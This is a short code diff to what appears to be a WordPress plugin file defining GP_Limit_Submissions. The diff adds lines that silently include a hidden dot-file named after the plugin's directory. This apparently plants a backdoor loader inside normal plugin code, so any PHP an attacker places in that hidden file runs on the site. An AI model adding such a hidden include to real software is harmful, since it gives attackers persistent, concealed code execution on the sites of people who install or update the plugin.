@@ -4,6 +4,10 @@ if ( ! class_exists( 'GP_Feed_Plugin' ) ) {
 	return;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Limit_Submissions extends GP_Feed_Plugin {
 
 	/**
